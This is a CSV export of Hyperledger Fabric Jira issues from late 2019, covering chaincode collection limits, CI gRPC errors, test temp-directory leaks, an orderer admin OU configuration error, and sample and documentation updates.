No way to instantiate collections file on the channel without upgrading chaincode,FAB-17130,43435,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,nileshdeotale,nileshdeotale,23/Nov/19 6:11 AM,04/Jan/20 8:33 PM,28/Oct/23 3:09 AM,04/Jan/20 8:33 PM,v1.4.3,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,,,,,,"Fabric does not allow same chaincode version re-instantiated on the given channel. One has to upgrade chaincode then instantiate. However, in case of private data chaincode .. example marbles_private , one may want to just update collection json on the same channel without upgrading chaincode. Currently this is not possible.
Will be good to add capability to update collections.json on a given channel without need to upgrade chaincode.",,mastersingh24,nileshdeotale,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0157v:",,,,Unset,Unset,,"Create a network with 2 orgs with 2 peers in each
Create a channel say channel1
Join all peers to the channel
Install marbles private chaincode on all peers
Instantiate marbles_private_go chaincode with collections file with only org1 , on channel1
Run invokes 
Private data should be visible only in org1 peers
now update collection file to add org2 
notice that there is no way to update collection file on the channel without insantiating new version of chaincode. 
This looks like a limitaiton to me as one would need to update collections file as new orgs join the network.",,Unset,,,,,,Unset,,Unset,,(Please add usage information),mastersingh24,nileshdeotale,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Jan/20 8:33 PM;mastersingh24;This is not a bug ... this is simply how things work in 1.4 and earlier.
The new lifecycle in 2.0 and later resolves this;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
UNAVAILABLE: TCP Read failed,FAB-17131,43436,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,rameshthoomu,rameshthoomu,23/Nov/19 6:52 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,26/Feb/20 1:33 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,ci_falure,,,,,"Observed initial proposals are failing on *samplejs* chaincode on release-1.4 branch in +kafka-notls+ network. Below is the error log
{code:java}
2019-11-22T18:25:31.795Z - ^[[34mdebug^[[39m: [ChannelEventHub.js]: _shutdown - shutdown existing stream
2019-11-22T18:25:31.795Z - ^[[34mdebug^[[39m: [ChannelEventHub.js]: _disconnect - end -- called due to:: 14 UNAVAILABLE: TCP Read failed, peer:169.63.151.28:31000
2019-11-22T18:25:31.795Z - ^[[34mdebug^[[39m: [ChannelEventHub.js]: on status - status received: {""code"":14,""details"":""TCP Read failed"",""metadata"":{""_internal_repr"":{},""flags"":0}} peer:169.63.151.28:31000
^[[32minfo^[[39m: [2019-11-22T18:25:31.796Z PTE 1 main]: stderr: 2019-11-22T18:25:31.796Z - ^[[34mdebug^[[39m: [Peer.js]: sendProposal - Received proposal response from: grpc://169.63.151.28:31000 status: Error: 14 UNAVAILABLE: TCP Read failed
^[[32minfo^[[39m: [2019-11-22T18:25:31.796Z PTE 1 main]: stderr: 2019-11-22T18:25:31.796Z - ^[[34mdebug^[[39m: [client-utils.js]: sendPeersProposal - Promise is rejected: Error: 14 UNAVAILABLE: TCP Read failed
^[[32minfo^[[39m: [2019-11-22T18:25:31.796Z PTE 1 main]: stderr: ^[[31merror^[[39m: [2019-11-22T18:25:31.796Z PTE 1 exec]: [Nid:chan:org:id=0:testorgschannel1:org1:0 invoke_move_dist_evtBlock] proposal failed 1, ""83623d87c58a7c0b7707c4d02f4eb095c9257d842159546a259938ec481592e8""
{code}
Verified the peer logs with debug mode enabled but didn't find any weird behavior.

The above failures are happening consistently only in kafka-noTLS (samplejs chaincode) network.

 ",,harrisob@us.ibm.com,rameshthoomu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17015,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqfo:h",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),harrisob@us.ibm.com,rameshthoomu,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jan/20 4:51 AM;scottz;Retest after fabric is fixed in 2.0 with grpc listener launch timing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Matrix Integration Tests,FAB-17132,43437,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,24/Nov/19 6:27 AM,10/Dec/19 1:31 AM,28/Oct/23 3:09 AM,02/Dec/19 12:31 PM,,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01583:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Action to Trigger CI,FAB-17133,43440,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,24/Nov/19 1:53 PM,18/Jan/20 12:52 PM,28/Oct/23 3:09 AM,18/Jan/20 12:52 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0158b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document private data enhancements in Fabric v2.0 including sharing patterns,FAB-17135,43442,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,25/Nov/19 3:52 PM,11/Dec/19 2:03 AM,28/Oct/23 3:09 AM,11/Dec/19 2:03 AM,,,,,,,,,,v2.0.0,,,,fabric-docs,fabric-ledger,,,,,,,,0,,,,,,"Finalize doc for v2.0 private data enhancements:
collection level endorsement policy
implicit org-specific collections
GetPrivateDataHash() api
inclusion of private data in events
memberOnlyWrite property 
 
Also document private data sharing patterns and example.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15790,FAB-16561,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-5108,,,No,,Unset,No,,,"1|i008rj:iwx4i",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Nov/19 9:34 PM;denyeart;https://github.com/hyperledger/fabric/pull/314;;;","09/Dec/19 3:28 PM;denyeart;https://github.com/hyperledger/fabric/pull/380;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix some spelling error in the release-1.4,FAB-17136,43444,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bjzhang03,bjzhang03,bjzhang03,25/Nov/19 5:54 PM,27/Nov/19 5:18 PM,28/Oct/23 3:09 AM,27/Nov/19 5:18 PM,,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,,,,,,"When I read the code,I found some spelling error,so I want to solve it",,bjzhang03,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01597:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bjzhang03,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Delete release test suite from fabric-test/release-1.4 branch,FAB-17137,43448,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,rameshthoomu,rameshthoomu,26/Nov/19 1:25 AM,03/Dec/19 6:22 AM,28/Oct/23 3:09 AM,03/Dec/19 6:22 AM,v1.4.4,,,,,,,,,v1.4.4,,,,fabric-quality,,,,,,,,,0,,,,,,Delete dead release test suite from fabric-test/release-1.4 branch.,,bharadwajambati1,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzxk",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,rameshthoomu,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Nov/19 1:33 AM;bharadwajambati1;[https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34466/];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabcar go to use the new programming model,FAB-17139,43453,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,awjh-ibm,awjh-ibm,awjh-ibm,26/Nov/19 6:36 PM,10/Dec/19 6:46 PM,28/Oct/23 3:09 AM,10/Dec/19 6:46 PM,,,,,,,,,,v2.0.0,,,,fabric-samples,,,,,,,,,0,,,,,,"The existing typescript and java fabcar samples use the new programming model

Now that the programming model is being added to go the go fabcar sample should also be updated to the new model",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FABCAG-1,,,No,,Unset,No,,,"1|i015ar:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update commercial paper to include Go chaincode,FAB-17140,43454,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,awjh-ibm,awjh-ibm,awjh-ibm,26/Nov/19 6:42 PM,24/Jan/20 11:28 PM,28/Oct/23 3:09 AM,24/Jan/20 11:28 PM,,,,,,,,,,v2.0.0,,,,fabric-samples,,,,,,,,,0,,,,,,The commercial paper sample includes chaincode in the new programming model for node and java. Now Go has been updated to include this new model the commercial paper sample should include a Go version.,,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FABCAG-1,,,No,,Unset,No,,,"1|i015az:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabric docs to reflect new Go programming model,FAB-17141,43455,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,awjh-ibm,awjh-ibm,awjh-ibm,26/Nov/19 7:15 PM,06/Dec/19 2:37 AM,28/Oct/23 3:09 AM,06/Dec/19 2:37 AM,,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,"When Node and Java introduced the new programming model the fabric documentation was updated to reflect the changes. 

With Go being updated to the new model, the docs should be updated in the manner",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FABCAG-1,,,No,,Unset,No,,,"1|i008rj:iwyr",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Doc how Fabric uses persistent storage,FAB-17142,43456,,Documentation,Closed,FAB,Fabric,software,denyeart,,,High,Done,,pandrejko,pandrejko,26/Nov/19 10:28 PM,18/Nov/20 4:08 AM,28/Oct/23 3:09 AM,18/Nov/20 4:08 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"we should have some place we can reference which shows the various settings / places where persistent storage is used :{color} 
[https://stackoverflow.com/a/59031241/6160507]",,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65jk",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jan/20 10:31 PM;pandrejko;[~negupta][~joe-alewine] Do you think it would be appropriate to include this in our new deployment guide? This is not a line item we have in our toc anywhere.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update BASEVERSION in release-1.4 fabric-test branch,FAB-17144,43458,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,27/Nov/19 12:13 AM,05/Dec/19 11:32 PM,28/Oct/23 3:09 AM,05/Dec/19 11:32 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Update BASEVERSION to 1.4.5 in release-1.4 fabric-test branch,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015bn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Dec/19 11:45 PM;rameshthoomu;https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34468/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add test network to samples,FAB-17145,43459,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,27/Nov/19 12:37 AM,13/Dec/19 6:00 AM,28/Oct/23 3:09 AM,13/Dec/19 6:00 AM,v2.0.0,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"Add test network that will be the successor to the first network script to the fabric samples. The test network has the following advantages

- No end to end, users can chose checkpoints of bringing up the network, creating a channel, and deploying chaincode
- Better organized and allows users to find artifacts more easily
- Supports CA's
- Only one peer per org
- Faster to deploy.",,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16604,,,No,,Unset,No,,,"1|i015bv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Dec/19 4:57 AM;negupta;https://github.com/hyperledger/fabric-samples/pull/80;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Validation tests do not clean up their temporary directories,FAB-17146,43460,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baidang201,sykesm,sykesm,27/Nov/19 12:40 AM,02/Dec/19 12:29 PM,28/Oct/23 3:09 AM,02/Dec/19 12:29 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,help-wanted,,,,,"My tmpfs filled up today. When I looked, I saw hundreds of directories like this:
{code}
drwx------   2 sykesm sykesm  4096 Nov 19 11:16 v1.3-validation610594591
drwx------   2 sykesm sykesm  4096 Jun 19 18:10 v1.3-validation619593636
drwx------   2 sykesm sykesm  4096 Nov 12 14:19 v1.3-validation639568270
drwx------   2 sykesm sykesm  4096 Oct 28 19:25 v1.3-validation663285767
drwx------   2 sykesm sykesm  4096 Nov  5 19:57 v1.3-validation718410289
drwx------   2 sykesm sykesm  4096 Nov 12 14:19 v1.3-validation767029207
drwx------   2 sykesm sykesm  4096 Nov 21 12:01 v1.3-validation781949214
drwx------   2 sykesm sykesm  4096 Jul 16 15:03 v1.3-validation798632841
drwx------   2 sykesm sykesm  4096 Jun 11 18:01 v1.3-validation807957324
drwx------   2 sykesm sykesm  4096 Jul 16 15:03 v1.3-validation814011149
drwx------   2 sykesm sykesm  4096 Sep 11 13:15 v1.3-validation846409913
{code}

This is due to the following code in TestMain:
{code}
func TestMain(m *testing.M) {
	testDir, err := ioutil.TempDir("""", ""v1.3-validation"")
	if err != nil {
		fmt.Printf(""Could not create temp dir: %s"", err)
		os.Exit(-1)
	}
	defer os.RemoveAll(testDir)
{code}

A defer from TestMain will never execute.

And, with most things validation, the code was duplicated.

{code}
workspace/fabric/src/github.com/hyperledger/fabric/core/handlers/validation/builtin/v20/validation_logic_test.go
workspace/fabric/src/github.com/hyperledger/fabric/core/handlers/validation/builtin/v13/validation_logic_test.go
{code}",,guoger,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015c3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Nov/19 2:32 PM;guoger;https://github.com/hyperledger/fabric/pull/329;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Admin node OU fails when deploying Fabric 2.0,FAB-17147,43461,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Environment Issue,,negupta,negupta,27/Nov/19 12:46 AM,27/Nov/19 7:19 AM,28/Oct/23 3:09 AM,27/Nov/19 7:19 AM,v2.0.0,,,,,,,,,,,,,,,,,,,,,,0,,,,,,Orderer Admin OU that works on Fabric 1.4.3 does not work on Fabric 2.0.,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015cb:",,,,Unset,Unset,,"Create orderer MSP folder with admin OU declared. All capabilities are set to V2_0.
When the orderer is stood up, the orderer fails with the following error:

2019-11-26 15:14:39.521 UTC [orderer.common.server] Main -> PANI 006 Failed validating bootstrap block: initializing channelconfig failed: could not create channel Orderer sub-group config: setting up the MSP manager failed: admin 0 is invalid [The identity does not contain OU [CLIENT], MSP: [OrdererMSP],cannot test for classification, node ou for type [ADMIN], not defined, msp: [OrdererMSP]]
panic: Failed validating bootstrap block: initializing channelconfig failed: could not create channel Orderer sub-group config: setting up the MSP manager failed: admin 0 is invalid [The identity does not contain OU [CLIENT], MSP: [OrdererMSP],cannot test for classification, node OU for type [ADMIN], not defined, msp: [OrdererMSP]]


If I leave the admin certs folder empty, I get the following error expecting admincerts:

2019-11-26 10:43:06.185 EST [common.tools.configtxgen] main -> FATA 1d5 Error on outputBlock: could not create bootstrapper: could not create channel group: could not create orderer group: failed to create orderer org: 1 - Error loading MSP configuration for org: OrdererOrg: could not load a valid admin certificate from directory /Users/nikhilgupta/2.0-alpha/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp/admincerts: stat /Users/nikhilgupta/2.0-alpha/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp/admincerts: no such file or directory
",,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Nov/19 7:19 AM;negupta;Tested again and got this to work. Probably was a problem with my local binaires;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
bccsp/sw/impl_test does not cleanup temporary directories,FAB-17148,43462,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baidang201,sykesm,sykesm,27/Nov/19 12:48 AM,02/Dec/19 10:50 AM,28/Oct/23 3:09 AM,02/Dec/19 10:50 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-crypto,,,,,,,,,0,help-wanted,,,,,"My tmpfs filled up today. When I looked in the directory, I found hundreds of directory entries like this:
{code}
bccsp-sw012112472                                                                                                                                                                    
bccsp-sw013888357                                                                                                                                                                    
bccsp-sw018301977                                                                                                                                                                    
bccsp-sw018547488                                                                                                                                                                    
bccsp-sw025594217                                                                                                                                                                    
bccsp-sw027997722                                                                                                                                                                    
bccsp-sw028166357                                                                                                                                                                    
bccsp-sw028412737                                                                                                                                                                    
bccsp-sw032099235                                                                                                                                                                    
bccsp-sw037743897                                                                                                                                                                    
bccsp-sw074214301                                                                                                                                                                    
bccsp-sw077179605                                                                                                                                                                    
bccsp-sw115707765                                                                                                                                                                    
bccsp-sw136555114                                                                                                                                                                    
bccsp-sw158334336                                                                                                                                                                    
bccsp-sw163894744                                                                                                                                                                    
bccsp-sw180537190                                                                                                                                                                    
bccsp-sw196812380                                                                                                                                                                    
bccsp-sw230348096                                                                                                                                                                    
bccsp-sw257630673                                                                                                                                                                    
bccsp-sw270912640                                                                                                                                                                    
bccsp-sw274183369                                                                                                                                                                    
bccsp-sw274615136                                                                                                                                                                    
bccsp-sw274685647                                                                                                                                                                    
bccsp-sw280747669                                                                                                                                                                    
bccsp-sw286267436                                                                                                                                                                    
bccsp-sw288349854                                                                                                                                                                    
bccsp-sw312212046                                                                                                                                                                    
bccsp-sw370193145                                                                                                                                                                    
bccsp-sw377809871                                                                                                                                                                    
bccsp-sw383122108                                                                                                                                                                    
bccsp-sw384270519                                                                                                                                                                    
{code}

The bccsp tests create a temporary directory out of TestMain and rely on a defer to clean them up. Since TestMain will exit without returning, the defer will never run.

{code}
func TestMain(m *testing.M) {
	tests := []testConfig{
		{256, ""SHA2""},
		{256, ""SHA3""},
		{384, ""SHA2""},
		{384, ""SHA3""},
	}

	var err error
	tempDir, err = ioutil.TempDir("""", ""bccsp-sw"")
	if err != nil {
		fmt.Printf(""Failed to create temporary directory: %s\n\n"", err)
		os.Exit(-1)
	}
	defer os.RemoveAll(tempDir)
{code}",,guoger,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015cj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Nov/19 2:33 PM;guoger;https://github.com/hyperledger/fabric/pull/328;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
